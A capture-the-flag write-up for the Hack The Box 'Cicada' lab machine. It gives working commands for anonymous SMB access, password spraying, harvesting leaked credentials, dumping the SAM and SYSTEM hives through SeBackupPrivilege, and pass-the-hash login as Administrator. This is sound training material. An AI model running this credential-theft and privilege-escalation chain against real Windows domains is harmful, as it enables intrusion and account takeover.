---
title: "[HTB] Cicada"
date: 2025-04-22 12:00:00 +0000
categories: [Writeups]
tags: [htb, cicada, smb, rce]
image:
  path: /assets/img/htb-cicada.png  # Optional: add your own image
  alt: "HTB Cicada"
---

# User Flag

## Recon

Run `nmap` against the target, using the `-Pn` flag since it's Windows.

```shell
nmap -sV -sC 10.10.11.35 -Pn

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 10:38 UTC
Nmap scan report for 10.10.11.35
Host is up (0.034s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-22 17:38:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2025-04-22T17:38:58
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.71 seconds
```

We can see port 53 is open, indicating this is a domain controller, and `smb` is also open. Let's try to connect using an SMB NULL session.

```shell
smbclient -L \\10.10.11.35\
```

The password prompt appears, but hitting enter skips this and gives us anonymous login and displaying the shares. There's a non-default share called **HR**, which we can list to see the contents.

```shell
smbclient \\\\10.10.11.35\\HR
```

There's a text file which we can download and inspect. It reads:

```text
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

From the text file we can see a default password:

Cicada$M6Corpb*@Lp#nZp!8

Let's try to enumerate the domain a bit more. Using `netexec`:

```shell
netexec smb 10.10.11.35

SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)

```

We can try using Impacket's `netlookupids.py` to enumerate users on the system by passing it the **guest** account with no password:

```shell
python3 lookupsid.py guest@10.10.11.35 -target-ip 10.10.11.35 -port 445 -no-pass
```

We get a bunch of hits back...

```text
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)
```

Since we've got the password from earlier enumeration, we can now use this to spray against discovered users to see if any of them are using the default password, having not reset it to their own. 

## Exploitation

Use `nxc` to spray:

```shell
nxc smb 10.10.11.35 -u ~/HTB/Cicada/newusers.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --users --continue-on-success
```

We get a hit against **michael.wrightson**:

```text
SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
```

So we can try enumerating further by authenticating as that user:

```shell
nxc smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

The output shows a user which has left information within AD - a cleartext password.

```text
SMB         10.10.11.35     445    CICADA-DC        david.orelious                2024-03-14 12:17:29 15      Just in case I forget my password is aRt$Lp#7t*VQ!3
```

We can then enumerate some shares as the newly identified user, using `smbclient`.

```shell
smbclient -L \\\\10.10.11.35\\ -U david.orelious
```

This shows a share named **DEV**, which we can connect to and enumerate further.

```shell
smbclient \\\\10.10.11.35\\DEV -U david.orelious
```

The share contains a file called "Backup_script.ps1", which when opened displays the following:

```text
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

This discloses a further password for **emily.oscars**, which we can now use to authenticate against the machine using `evilwin-rm`.

```shell
evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

Once authenticated, the **user.txt** flag can be found on the user's desktop.

# Root Flag

## Identifying a Privesc Vector

As the **emily.oscars** user, we can find out more about what privileges they have by running:

```shell
whoami /all
```

This shows us that the user has the `SeBackupPrivilege` privilege.

A quick Google search and we can find out more about this, and see that it can be a potential privesc attack path, as it allows our user to read all files within the system.

## Exploitation

I found an [article] [https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/]which explained the exploit and how it can be leveraged to attain a privesc.

Since our user can read all files in the system, we can use this to pull out sensitive information back to our attacking machine. 

Firstly, we create a Temp directory, and then save the `hklm\sam` and `hklm\system` files within it:

```powershell
cd C:\
mkdir Temp
reg save hklm\sam C:\Temp\sam
reg save hklm\system C:\Temp\system
```

Once we've done this, we can use `evil-winrm`'s handy feature to download direct to our attacking machine, within its current working directory.

```shell
cd Temp
download sam
download system
```

Once downloaded, we can extract the secrets from the SAM and SYSTEM files using `pypykatz`, which is essentially `mimikatz` wrapped in Python. This can be found here: [pypykatz][https://github.com/skelsec/pypykatz]. 

```shell
pypykatz registry --sam sam system
```

```text
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 3c2b033757a49110a9ee680b46e8d620
============== SAM hive secrets ==============
HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

We can then pull the Administrator's NTLM hash and pass it to `evil-winrm`:

```shell
evil-winrm -i 10.10.11.35 -u administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
```

Root flag found on Administrator's desktop.
